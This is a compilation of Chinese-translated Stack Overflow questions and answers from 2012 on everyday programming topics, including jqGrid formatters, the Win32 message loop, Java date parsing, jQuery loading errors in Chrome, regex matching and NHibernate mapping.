# jquery - 创建自定义“操作”格式化程序 - jqgrid

> ID：10658807
> 
> 赞同：0
> 
> 时间：2012-05-18T19:44:38.930
> 
> 标签：jquery, jqgrid, formatter

我想知道是否可以使用自己的自定义图像添加自定义“动作”格式化程序。我想要完成的是在每一行上都有一个超链接图像，这样当用户单击它时，会打开一个对话框，其中包含更多选项。

有没有办法做到这一点？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T20:45:19.160

是有可能的。[我在答案](https://stackoverflow.com/a/10179993/315935)和[这个](https://stackoverflow.com/a/6627201/315935)中描述了相应的解决方案，包括工作演示。`click`您可以在事件处理程序中定义任何操作。例如，您可以打开一些对话框。

如果您只需要添加带有图像的列，您可以按照[此处](https://stackoverflow.com/a/5305904/315935)描述的方法进行操作。在这种情况下，您可以使用`onCellSelect`或`beforeSelectRow`回调来实现您的自定义`onClick`处理程序。

# c++ - 无限窗口消息循环

> ID：10658813
> 
> 赞同：0
> 
> 时间：2012-05-18T19:44:51.820
> 
> 标签：c++, c, windows, winapi, message

我的程序中有这个消息循环：

```
while (true) {
    if (PeekMessage(&msg, window, 0, 0, PM_REMOVE)) {
        if (msg.message == WM_QUIT) {
            MessageBox(NULL, L"Quit", L"", 0);
            break;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    } else {
        Render();
    }
} 
```

这个循环永远不会结束。即使主窗口消失，它也不会显示消息框。这是 WndProc 代码：

```
switch (msg) {

    case WM_CLOSE :
        DestroyWindow(hwnd);
        break;

    case WM_DESTROY :
        PostQuitMessage(0);
        break;

    default :
        return DefWindowProc(hwnd, msg, wParam, lParam);
        break;
}

return 0; 
```

有人可以帮我吗？我真的把我的头发拉了出来。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-18T19:51:28.390

你在打电话`PeekMessage(&msg, window, ...)`。如果`window`不是`NULL`，您将永远不会得到`WM_QUIT`，因为`WM_QUIT`与窗口无关。

相反，只需使用`PeekMessage`/`GetMessage`调用`NULL` `HWND`. `DispatchMessage`将根据需要将其发送到右侧`WndProc`。（一般来说，[制作`GetMessage`/`PeekMessage`过滤`HWND`是一个坏主意。](http://blogs.msdn.com/b/oldnewthing/archive/2005/02/09/369804.aspx)）

# java - Java 无法解析的日期：美国/芝加哥时区

> ID：10658816
> 
> 赞同：2
> 
> 时间：2012-05-18T19:45:41.117
> 
> 标签：java, parsing, date

我的应用程序尝试解析美国/芝加哥时区的日期时遇到问题。我已经查看了一堆其他 ParseException 问题，并且我认为我已经了解了 Java 中日期解析的所有常见问题。以下代码适用于我遇到的所有其他日期/时间，但由于某种原因，美国/芝加哥时区的所有日期都无法解析。

我为 dateFormat 设置了语言环境，这并不重要。我检查了其他每个部分是否正常，我删除了不可见的控制字符，我重新输入了字符串以确保没有恶意字符被复制/粘贴，但每次都会抛出异常。

有什么想法吗？

```
dateFormat = new SimpleDateFormat("EEE MMM dd k:mm:ss zzz ");
dateString = "Wed May 02 15:45:47 America/Chicago ";

try {
    entry.setDateTaken(dateFormat.parse(dateString));
}  catch (java.text.ParseException e) { } 
```

我不想走 Joda 路线是有原因的，这是一件很简单的事情，我不应该这样做。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-18T19:56:19.700

我*相信*问题在于您使用的是奥尔森时区 ID，我认为不*支持* `SimpleDateFormat`解析这些。当然使用你的代码我对“欧洲/伦敦”有同样的问题，所以它不是芝加哥特有的。你能举出任何具有这种时区标识符风格的例子*吗*？

# python - 在 Python 中保存/加载列表

> ID：10658818
> 
> 赞同：2
> 
> 时间：2012-05-18T19:45:57.827
> 
> 标签：python, list

我是 python 新手（和一般编程），正在为一个典型的类创建一个数据库/注册。我希望用户能够从数据库中添加和删除学生，我主要为此使用列表，但遇到了困难。

每当我重新启动程序时，用户已修改的列表返回到我在代码中指定的默认列表。我环顾互联网并尝试将列表保存到单独的 txt 文件中。但是，每次我重新启动程序时，txt 文件也会回到默认值。我希望您能给我一种方法来保存对列表所做的更改并保持这种状态。这是代码（不是很好）：

```
def menu():
    print "*****************CLASS REGISTER*****************"
    print "Press 1 See The List Of Pupils"
    print "Press 2 To Add New Pupils"
    print "Press 3 To Remove Pupils"
    print "Press 0 To Quit \n"

filename = open('pupil.txt','r')

pupil = ["James Steele", "Blain Krontick", "Leeroy Jenkins", "Tanvir Choudrey"]

def see_list(x):
    print x

def add_pupil(x):
    print "You have chosen to add a new pupil.\n"
    option = raw_input("Please type the childs name.")
    x.append(option)
    filename = open('pupil.txt','w') 
    filename.write('\n'.join(pupil)) 
    filename.close() 
    print option, "has been added to the system."
    return x

def delete_pupil(x):
    print "You have chosen to remove a pupil.\n"
    option = raw_input("Please type the childs name.")
    if option in x:
        x.remove(option)
        filename = open('pupil.txt','w') 
        filename.write('\n'.join(pupil)) 
        filename.close() 
        print option, "has been removed from the system."
    else:
        print "That person is not in the system."
    return x

one = 1
while one != 0:
    menu()
    option = input() 
    if option == 1:
        see_list(pupil)
    elif option == 2:
        add_pupil(pupil)
    elif option == 3:
        delete_pupil(pupil)
    elif option == 0:
        break
    else:
        print "That is not a valible choice."

filename = open('pupil.txt','w') 
filename.write('\n'.join(pupil)) 
filename.close() 

if option == 0:
    quit 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-18T19:48:08.377

好吧，您只是打开`pupil.txt`文件，但从不读回其内容。你需要这样的东西：

```
filename = open('pupil.txt', 'r')
contents = filename.read()
filename.close()

pupil = [name for name in contents.split('\n') if name] 
```

此外，您需要处理`pupil.txt`文件不存在的情况；这可以通过`try..except`围绕 IO 调用的块来完成。

最后，正如上面提到的评论之一，看看这个`pickle`模块，它可以让你将一个 Python 对象以 Python 的内部格式存储在一个文件中（这不是真正可读的，但可以为你省去很多麻烦）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:50:22.283

与您的问题没有直接关系，但是：

```
one = 1
while one != 0:
    ... 
```

很傻。所有你需要的是：

```
while True:
    ... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T19:53:10.433

这就是数据库的用途。使用[`sqlite`](http://www.sqlite.org/)- 一个简单的基于文件的数据库，其库[与 python 捆绑在一起](http://docs.python.org/library/sqlite3.html)。

# iphone - 登录视图控制器，iphone

> ID：10658819
> 
> 赞同：0
> 
> 时间：2012-05-18T19:46:37.433
> 
> 标签：iphone

我有 2 个文本字段，一个用于 usrname，另一个用于密码。

**问题**：输入用户名并从键盘点击next后，如何跳转到密码字段输入密码..

欢迎任何意见在这里。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:51:39.770

检查这个问题。它几乎澄清了如何实施胡安所说的。[如何浏览文本字段（下一步/完成按钮）](https://stackoverflow.com/questions/1347779/how-to-navigate-through-textfields-next-done-buttons)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:49:32.980

您需要实现 UITextFieldDelegate 协议并使用该`becomeFirstResponder`方法将焦点更改为下一个文本字段。

您需要在委托上实现的方法是`textFieldShouldReturn:`.

这是我拥有的示例实现：

```
-(BOOL) textFieldShouldReturn:(UITextField *)textField 
{
    [passwordField becomeFirstResponder];

    if (self.passwordField == textField) {
        [self loginAction:textField];
    }

    return YES;
} 
```

您可以为两个文本字段设置实现类委托。

希望能帮助到你！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-18T19:53:22.050

你想用什么来表示某人已经完成了打字？无论条件是什么，只要使用

```
[myTextField becomeFirstResponder]; 
```

使下一个文本字段受键盘控制的方法。实际上，这将创建“跳跃”。

此外，您可以这样做以连接下一个按钮作为跳转的触发器。

```
//amount received animations
[myTextField setDelegate:self];
[myTextField setReturnKeyType:UIReturnKeyDone];
[myTextField addTarget:self
                action:@selector(methodThatJumps:)
      forControlEvents:UIControlEventEditingDidEndOnExit]; 
```

而在跳转的方法中，只需使用上面的行。如果您希望我更好地解释它，请告诉我。

# jquery - Chrome：未捕获的 ReferenceError：$ 未定义

> ID：10658823
> 
> 赞同：7
> 
> 时间：2012-05-18T19:47:08.093
> 
> 标签：jquery, firefox, google-chrome

我在网页中使用 jQuery。`$`在 Internet Explorer 中使用时，它工作正常。在 Chrome 或 Firefox 中引用 `$`时失败并出现错误：

```
Uncaught ReferenceError: $ is not defined. 
```

截屏：

![在此处输入图像描述](../Images/9ea11ea0d627439a7951a266f00a20b0.png)

使用我的源代码：

```
<!DOCTYPE html>
<html>
<head>
   <script type="text/javascript" src="jquery-1.7.2.min.js"></script>
   <script type="text/javascript">
      function divClick(sender, event)
      {
//       var chk = $(sender).find("input").first()[0];
         var chk = jQuery(sender).find("input").first()[0];
         alert("Works in ie");
      }
   </script>
</head>
<body>

<div onclick="divClick(this, event)">
    <input type="checkbox">
</div>

</body>
</html> 
```

**注意：**浏览器被定向到本地文件系统上的文件：

![在此处输入图像描述](../Images/5b39b75c8471d0b646839ae6c84e731e.png)

**更新**：尝试将其更改为`jQuery`.

**更新**：Chrome 找到 jquery 文件（即没有 404）：

![在此处输入图像描述](../Images/472cb13b0a4b1b1c4c3e08da5f227aa6.png)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-18T20:08:33.813

这个问题只是为了记录 Chrome 和 Firefox 中的错误：

```
Html File encoding           IE9      Chrome
=========================    =======  ======
Windows-1252                 Works    Works
UTF-8 (without BOM)          Works    Works 
UTF-8 (with BOM EFBB)        Works    Works 
UTF-16 (with LE BOM FFFE)    Works    Fails
UTF-16 (with BE BOM FEFF)    Works    Fails 
```

大概 Chrome（和 Firefox）假设一个单独的`script`文件具有与该文件相同的编码`html`。

然后 Chrome 尝试读取`jquery-1.7.2.js`为 UTF-16，并震惊地发现该文件是纯 (Windows-1252) 垃圾。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-18T19:50:25.607

检查路径`jquery-1.7.2.min.js`是否正确。如果使用 firefox 或 chrome 开发人员工具，您可以检查 firebug 以查看文件是否正在下载。您很可能会为 jQuery 文件获得 404，因为 $ 在页面上未定义，它是 jQuery 对象的别名。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-11-28T03:40:35.807

您可以在 Firefox 和 Chrome 中使用 Javascript 获取此错误：

```
Uncaught ReferenceError: $ is not defined. 
```

如果你像这样包含 jquery：

```
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.1/jquery.min.js">
</script> 
```

并且您的服务器配置为不允许在运行时下载和运行 javascript 内容，然后您会收到上述错误。看一下整个错误：

```
[blocked] The page at https://yoursite.com/blah# ran insecure content 
from http://ajax.googleapis.com/ajax/libs/jquery/1.3.1/jquery.min.js.
/blah#:1
Uncaught ReferenceError: $ is not defined 
```

这意味着您的 Web 服务器不允许动态加载 javascript 内容。这是一个安全风险，因为有人可能会在其中注入邪恶的东西供您下载并拥有您的服务器。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-05-10T15:05:48.897

以上均不适用于 Chrome 49 上的我。我必须将类型指定为“应用程序/javascript”，如下所示：

```
<script src="lib/jquery-1.11.3.min.js" type="application/javascript"></script> 
```

使用“文本/javascript”不起作用。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-18T19:51:32.727

尝试 ：

```
var chk = jQuery(sender).find("input").first()[0]; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-18T20:05:59.143

您的函数需要包装在一个准备好的 dom 中：

```
$(function(){

  function divClick(sender, event)
  {
     var chk = $(sender).find("input").first()[0];
     alert("Works in ie");
  }

}); 
```

这将允许该功能仅在页面加载后触发。您的脚本也应该在结束 HTML 标记之前加载。不是所有的顶部。这将允许页面更快地加载 HTML 和 css，因为它不必等待 JS 加载。

还要确保从 HTML 中获得正确的 jQuery 路径。

最后一件事，

相反，如果您的点击侦听器位于内联 HTML 中，请尝试将其移至 JS。这只是一种更清洁、更有条理的处理方式。

```
$('.clickMe').click(function(){
    //do stuff here
}) 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-05-18T20:19:30.370

我没有在 html 中使用 onclick，而是通过 Jquery 代码中的 id 分配了所有内容。

我不确定您是否想知道是否选中了 div 或是否选中了复选框。如果单击 div，我将输入检查放入代码中并注释掉代码。

```
<!DOCTYPE html>
<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js" type="text/javascript"></script>

<script type="text/javascript">
$(function(){
// $('#divid').unbind("click").click(function(){
$('#someid').unbind("click").click(function(){
if($(this).is(':checked')){
alert("checked");
}else{
alert("not checked");
}
});
});
</script>

</head>
<body>

<div id="divid"><input type="checkbox" id="someid"></div>

</body>
</html> 
```

# android - Android 中的小插图

> ID：10658828
> 
> 赞同：8
> 
> 时间：2012-05-18T19:47:54.233
> 
> 标签：android, image-processing

所以这就是我在 Android 中的晕影风格效果（图像是位图）：

```
public void vignette() {
    float radius = (float) (image.getWidth()/1.5);
    RadialGradient gradient = new RadialGradient(image.getWidth()/2, image.getHeight()/2, radius, Color.TRANSPARENT, Color.BLACK, Shader.TileMode.CLAMP);

    Canvas canvas = new Canvas(image);
    canvas.drawARGB(1, 0, 0, 0);

    final Paint paint = new Paint();
    paint.setAntiAlias(true);
    paint.setColor(Color.BLACK);
    paint.setShader(gradient);

    final Rect rect = new Rect(0, 0, image.getWidth(), image.getHeight());
    final RectF rectf = new RectF(rect);

    canvas.drawRect(rectf, paint);

    paint.setXfermode(new PorterDuffXfermode(Mode.SRC_IN));
    canvas.drawBitmap(image, rect, rect, paint);
} 
```

这“有效”，但有几个问题。首先，这不是一个真正的晕影，它只是一个渐变，所以你可以看到黑色的部分几乎一直到中心，而不是在靠近边缘的地方羽化。

使用的 RadialGradient 也只允许设置圆的半径而不是椭圆的半径。与圆形相比，椭圆能够更有效地匹配非方形图像的尺寸。

渐变的质量也不是很好。

我正在尝试从 ImageMagick 复制 vignetteImage 方法（我特指的是 php 版本）。我在 PHP 中有这段代码，可以生成我想要的图像样式：

```
$im = new IMagick('city.png');
$im->vignetteImage($width/1.5, 350, 20, 20); 
```

我尝试使用 NDK 构建 ImageMagick，但未能正确链接各种图像库（我只成功构建了 gif 支持，但没有 png、jpeg 或 tiff）。

我还附上了一张图片，比较了上面显示的两种方法。左边的图像是使用 ImageMagick 通过 php 生成的，右边的图像是使用上面显示的 Android 方法生成的。

![左：来自 php/ImageMagick 的小插图。 右：使用上述方法的 Android 小插图](../Images/8560dc6c52856613f27066e24d3b70b6.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-22T06:59:18.230

如果您仔细查看左侧的图像，tf 使用 Alpha（透明度）与右侧图像的指数增加，这是非常线性的。

显然`Shader.TitleMode.CLAMP`是一个线性函数。你应该做的是使用[RadialGradient(float x, float y, float radius, int[] colors, float[] position, Shader.TileMode tile)](http://developer.android.com/reference/android/graphics/RadialGradient.html#RadialGradient%28float,%20float,%20float,%20int%5B%5D,%20float%5B%5D,%20android.graphics.Shader.TileMode%29)在图像上定义 10 个或更多点，颜色值呈指数下降（黑色到透明）。

或者，您可以参考 ICS 画廊的画廊 3d 源[http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android-apps/4.0.1_r1/com/android/gallery3d /photoeditor/filters/VignetteFilter.java?av=h](http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android-apps/4.0.1_r1/com/android/gallery3d/photoeditor/filters/VignetteFilter.java?av=h)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-08-11T11:09:53.237

我知道这是一个古老的讨论，但它可能对某人有所帮助。您可以使用[AccelerateInterpolator](http://developer.android.com/reference/android/view/animation/AccelerateDecelerateInterpolator.html#getInterpolation%28float%29)生成 Taranfx 提到的点，它会锁定真棒。

# visual-studio-2010 - 是否可以移动单元测试并维护测试列表？

> ID：10658832
> 
> 赞同：1
> 
> 时间：2012-05-18T19:48:27.547
> 
> 标签：visual-studio-2010, unit-testing

我在 Visual Studio 中组织单元测试时遇到问题。一旦测试在测试列表中，更改命名空间、更改 TestClass 名称等会破坏所有测试列表的组织结构。我在解决方案的 vsmdi 文件中看到，每个测试和测试列表都有一个唯一的 GUID，更改的是路径更改，但我看不到任何更新测试列表以使用新位置的新 GUID 的方法。

也许我缺少一个工具可以在不破坏结构的情况下重新定位测试？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T22:03:18.863

不幸的是，测试列表不够聪明，无法跟踪重命名类或方法等更改 - 如果您更改某些内容，则测试最终会出现“不在列表中的测试”，并且会根据您的发现重新生成 vsdmi 文件。出于这个原因，我倾向于不使用测试列表或将 vsdmi 文件检查到源代码控制中。

相反，我使用测试列表编辑器窗口中的“分组依据”下拉菜单，并按项目或完整的类名分组（这使得一致地使用命名空间很重要）。

在 VS 2011 中，测试列表已[弃用](http://msdn.microsoft.com/library/dd286595%28VS.110%29.aspx)，所以我不希望这会得到修复。

# plone - z3c.forms 动态源提供程序返回空字典作为上下文对象

> ID：10658840
> 
> 赞同：2
> 
> 时间：2012-05-18T19:48:46.740
> 
> 标签：plone, zope, dexterity, z3c.form

我正在使用 Plone 4.1.4 并且我正在尝试获取模式的动态源。选择工作，我需要填充国家列表，这又取决于上下文对象。

我正在使用这个例子： http: [//plone.org/products/dexterity/documentation/manual/developer-manual/advanced/vocabularies](http://plone.org/products/dexterity/documentation/manual/developer-manual/advanced/vocabularies)

例如，对于 IContextSourceBinder，将返回一个空字典而不是实际的上下文对象：

```
from zope import interface
from zope.schema.vocabulary import SimpleVocabulary, SimpleTerm
from zope.schema.interfaces import IContextSourceBinder
import zope.schema
from z3c.form import form

class CountryGenerator(object):
    interface.implements(IContextSourceBinder)
    def __call__(self, context):
        #context is == {}
        import pdb; pdb.set_trace()
        return SimpleVocabulary([
            SimpleTerm(value="not_selected", title=_("Country Not Selected"))
                ])

class IStep(interface.Interface):
    region = schema.Choice(title=_("Select your country"),
                        required=True,
                        source=CountryGenerator,
                        default="not_selected")
class Step(form.Form):
    fields = field.Fields(IStep)
    label = _("Step")
    description = _("Select your country") 
```

当在 CountryGenerator.__call__() 方法中命中调试点并检查上下文对象时，后者结果只是一个空字典。

当我尝试在上面提到的文章中使用命名实用程序示例时，会发生类似的事情，上下文也有 {}。

谁能指出我可能做错了什么？

**更新**

调用表单的表单包装器的 ZCML 是

```
<browser:page
  name="view"
  for="Products.oldproduct.MyFolderishClass"
  class=".file.RegionClass"
  permission="zope2.View"
  /> 
```

RegionClass 继承自 Form 包装器的地方，可能是权限问题还是遍历问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T20:37:15.527

因为你的源是一个类，你需要实例化它：

```
class IStep(interface.Interface):
    region = schema.Choice(title=_("Select your country"),
                        required=True,
                        source=CountryGenerator(),
                        default="not_selected") 
```

在某些情况下，例如使用子表单或复杂表单小部件（用于列表选择的小部件内的小部件等），您需要按照`__parent__`指向适当外部上下文的指针返回 Plone 上下文。

# storyboard - 如何暂时禁用segue？

> ID：10658842
> 
> 赞同：0
> 
> 时间：2012-05-18T19:49:09.390
> 
> 标签：storyboard, segue

我正在使用带有 Storyboard 和 IOS 5.1 的 Xcode 4.3.2

在我的应用程序中，我需要暂时停用一个 segue（例如，因为表单不完整）。

有没有办法做到这一点 ？我在谷歌上一无所获。

谢谢你的帮助 ！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-19T07:24:59.257

糟糕，我发现...

我将segue直接插入单元格（正常做法）。

但是，要控制 segue，在我的例子中，要禁用它，我们必须将它直接连接到视图控制器。

然后我们可以 - 或不 -`performSegueWithIdentifier:sender:`在需要时通过调用来触发它！

# regex - 特定数字或特定单词的正则表达式

> ID：10658843
> 
> 赞同：0
> 
> 时间：2012-05-18T19:49:11.927
> 
> 标签：regex

对于表单上的安全问题，我希望用户输入`4`or`four`或后者的任何变体。

现在我有这个正则表达式`/\b4|four\b/gi`，它是我在这个网站上找到的一个变体。问题是用户可以输入`458`什么的。那么，有人可以帮帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T19:56:59.490

我不确定您所说的“后者的任何变化”是什么意思，但是：

```
/^(4|four)$/i 
```

将匹配 4 或 4 的整个字符串。比赛`^`只在开始和`$`结束时进行。`/i`表示不区分大小写（因此也可以接受 FOUR）。有些语言不采用这样的标志（在它们中，您必须查看有关如何进行不敏感匹配的文档）。如果你不能使用不区分大小写的匹配，你可以这样做：

```
/^(4|[fF][oO][uU][rR])$/i 
```

当然，无论您使用什么语言，都可能有相等比较。所以你可以这样做（例如）

```
if (str == "4" || str == "four") 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:58:16.227

尝试：

```
^4|four$ 
```

这将匹配“4”和“四”。根据您使用的编程语言，可能会有不区分大小写的选项，例如 C# 的[RegexOptions.IngoreCase](http://msdn.microsoft.com/en-us/library/system.text.regularexpressions.regexoptions.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T20:07:51.067

因此，您应该为此使用不区分大小写的比较。一些（也许是大多数）正则表达式风格将支持`(?i)`表示不区分大小写的模式。

```
^(?i)(?:4|four)$ 
```

但是，如果这是 JavaScript，那么您可以使用更像您开始使用的语法...

```
/^(?:4|four)$/i 
```

在这种情况下，这`/i`是不区分大小写的。但我删除`/g`了，因为它是用于全局匹配的，这里不需要。

请注意，我也放入`4|four`了一个`(?:non capturing)`组。`(capturing)`当您不需要对捕获的值执行任何操作时，这比使用传统组更有效。

然后围绕所有内容的`^`和`$`锚点将确保您没有额外的前导或后续字符。

# c# - c#中表单控件的透明度

> ID：10658846
> 
> 赞同：1
> 
> 时间：2012-05-18T19:49:18.920
> 
> 标签：c#, winforms, transparency

如何在 Windows 窗体上的某些元素上设置透明度？

我已经尝试了很多代码，但仍然没有。

这对我来说看起来很合乎逻辑，但它不起作用。

```
 SetStyle(ControlStyles.SupportsTransparentBackColor, true);
 label4.BackColor = Color.Transparent; 
```

我已将此代码放入构造函数中。

这是[链接](http://msdn.microsoft.com/en-us/library/wk5b13s4.aspx)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T20:22:22.000

`Labels`有点顽固，但可以使它们具有透明背景。在这里回答了类似的问题：[透明控制图片框](https://stackoverflow.com/questions/9387267/transparent-background-label-over-picturebox)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:55:48.760

尝试将其添加到表单本身...

```
this.TransparencyKey = System.Drawing.Color.Transparent; 
```

你会认为它是固有的，但在测试中添加它就可以了。然后将控件设置为此...

```
Label1.BackColor = System.Drawing.SystemColors.Window; 
```

这只是在一个测试项目中起作用，不太清楚为什么。这可能会使您的大部分表单透明，但希望您可以调整一些东西。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T19:57:58.900

Winforms 没有内置的控件透明度。但是，您可以解决此限制。

这是我最喜欢的解决方法：http: [//www.doogal.co.uk/transparent.php](http://www.doogal.co.uk/transparent.php)
它工作得很好，是一种通用解决方案，而不是“1 次”解决方案。

# nhibernate - 多个 HasMany 关系中表的流畅 NHibernate 映射

> ID：10658847
> 
> 赞同：1
> 
> 时间：2012-05-18T19:49:19.460
> 
> 标签：nhibernate, fluent-nhibernate, nhibernate-mapping

下面我的类映射有什么问题？

```
public class Foo
{
    public Foo()
    {
        ActualCurve = new List<Point>();
        TargetCurve = new List<Point>();
    }
    public virtual int Id { get; set; }
    public virtual string Name { get; set; }
    public virtual IList<Point> ActualCurve { get; set; }
    public virtual IList<Point> TargetCurve { get; set; }
}

public class Point
{
    public virtual int Id { get; set; }
    public virtual double X { get; set; }
    public virtual double Y { get; set; }
}

public class FooMapping() : ClassMap<Foo>
{
    Table("Foos");
    Id(x => x.Id).GeneratedBy.Identity();
    Map(x => x.Name).Not.Nullable();
    HasMany(x => x.ActualCurve ).Cascade.All();
    HasMany(x => x.TargetCurve ).Cascade.All();
}

public class PointMapping() : ClassMap<Point>
{
    Table("Points");
    Not.LazyLoad();
    Id(x => x.Id).GeneratedBy.Identity();
    Map(x => x.X).Not.Nullable();
    Map(x => x.Y).Not.Nullable();
} 
```

这些映射产生

```
CREATE TABLE [dbo].[Foos](
    [Id] [int] IDENTITY(1,1) NOT NULL,
    [Name] [nvarchar] NOT NULL,
    [RecipeRevisionId] [int] NOT NULL

CREATE TABLE [dbo].[Points](
    [Id] [int] IDENTITY(1,1) NOT NULL,
    [X] [float] NOT NULL,
    [Y] [float] NOT NULL,
    [FooId] [int] NOT NULL 
```

本质上，问题是当我从数据库中拉出一个持久的 Foo 对象时，Foo.ActualCurve 和 Foo.TargetCurve 列表都填充了两个列表的组合内容。显然没有一列可以说明 Foo 中哪一组点属于正确的曲线，但我不确定如何更改映射以保持两组不同的点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T21:52:53.550

我认为您需要为引用指定一个单独的列：

```
HasMany(x => x.ActualCurve ).Cascade.All().KeyColumn("ActualCurveId");
HasMany(x => x.TargetCurve ).Cascade.All().KeyColumn("TargetCurveId"); 
```

编辑：列-> KeyColumn

# .net - 如何强制 VisualStudio 检查 .Net Service Pack 兼容性？

> ID：10658855
> 
> 赞同：0
> 
> 时间：2012-05-18T19:49:37.810
> 
> 标签：.net, compatibility, missingmethodexception

当 .Net 服务包发布时，一些新类可能会使用新方法进行扩展。

其中一种方法是 WaitHandle.WaitOne(int timeout) 方法，该方法仅在 .Net 2.0 SP2 之后才存在。

当开发人员编写代码时，他们有时不会重读 MSDN（尤其是对于他们足够了解的东西），或者看不够彻底，而只是使用智能感知从下拉框中选择方法（因为他们有 .Net 2.0 sp2安装）。

然后，程序可以在没有 SP2 的框架 2.0 的计算机上引发 MethodMissingException。提前了解这种不兼容可能有助于避免此问题。

是否有可能以某种方式强制 Visual Studio (2010) 验证 Framwork 服务包的兼容性级别？也许有任何插件？我希望 Resharper 可以做到这一点，但似乎不能。

**编辑**：我想要的是，如果代码应该与 .Net SP1 兼容，那么编译器或插件会在开发人员尝试使用仅存在于 SP2 中的方法或类时警告他。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T20:05:03.710

当您编译 .net 应用程序以针对特定版本的框架时，该应用程序根本不会在旧版本上运行。

如果您尝试在缺少方法的旧/新版本框架的机器上编译 .NET 应用程序，编译器将捕获此类错误。

你能解释一下你想要达到什么目标吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T22:23:51.013

如果您使用过时标记 ( [http://msdn.microsoft.com/en-us/library/system.obsoleteattribute.aspx](http://msdn.microsoft.com/en-us/library/system.obsoleteattribute.aspx) ) 标记函数，则可以为开发人员输入警告消息，例如“使用函数 a 而不是功能 b"。

看看我问的这个问题：[ASP.NET and IIS7 Winsock Error](https://stackoverflow.com/questions/10141757/asp-net-and-iis7-winsock-error)。我无法使用“GetHostByAddress”，因为它已过时。

# google-app-engine - 如何检查 GAE 中的 Search API Quota 使用情况？

> ID：10658858
> 
> 赞同：2
> 
> 时间：2012-05-18T19:49:56.703
> 
> 标签：google-app-engine, gae-search

连续几天出现搜索 API 错误：

```
OverQuotaError: The API call search.IndexDocument() 
required more quota than is available. 
```

我几乎可以肯定我没有达到[配额限制]，但我找不到方法来确定。

我如何检查当前的配额使用情况，如果不在管理中，可能是通过代码。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T21:02:40.130

您现在无法检查搜索配额使用情况。它将很快在管理控制台中可见。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-23T12:19:59.110

您现在可以在配额管理控制台中检查您的 Search API 配额。它位于**报价详情**页面的**存储**部分下方。此功能于昨天（5-23-2012）添加，并在[官方 Google App Engine 博客](http://googleappengine.blogspot.com/2012/05/166-sdk-released.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3a%20GoogleAppEngineBlog%20%28Google%20App%20Engine%20Blog%29&utm_content=Google%20Reader)上发表了博文。

 *** * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T12:48:01.350

[您可以在此处](https://code.google.com/apis/console)查看所有提供 API 的 Google 服务的配额。我在那里找不到自定义搜索 API。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-24T11:24:53.687

我[在 appengine search api for java 上找到了配额，](https://stackoverflow.com/questions/10567267/quotas-on-appengine-search-api-for-java) 它表示速率限制为每分钟大约 100 到 120 个 API 调用。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-05T00:59:40.397

如果您需要 App Engine 搜索 API 的额外配额，您可以[在此处](https://docs.google.com/a/google.com/spreadsheet/viewform?formkey=dFFJUi1GUW1mVGpOQllJUjBUOUVJUUE6MQ#gid=0)申请。**

# javascript - jquery mobile中的最佳绑定时间

> ID：10658861
> 
> 赞同：2
> 
> 时间：2012-05-18T19:50:20.537
> 
> 标签：javascript, jquery, jquery-mobile

我有一个 html 文件中有多个 data-roles="page" 的 jquery 应用程序。

一开始绑定我所有的按钮会更好吗？或者在 pagecreate 事件中绑定某个“页面”上的按钮？

做一个比另一个有什么好处？

前任：

```
<script>
    $(document).delegate("#page1",'pagecreate', loadedFirstPage);
    $(document).delegate("#page2",'pagecreate', loadedSecondPage);

     function loadedFirstPage(){
         $('#link1').bind('tap',function(){
            console.log('Hello World');
         });

         //HERE?
         $('#link2').bind('tap',function(){
            console.log('Hello World Again');
         });
     }

     function loadedSecondPage(){
         //OR HERE?
         $('#link2').bind('tap',function(){
            console.log('Hello World Again');
         });
     }
</script>

<div id="page1" data-role="page">
   <a href="#page2" id="link1">Click here</a>
</div>

<div id="page2" data-role="page">
   <a href="#page1" id="link2">Click here Again</a>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T21:29:42.657

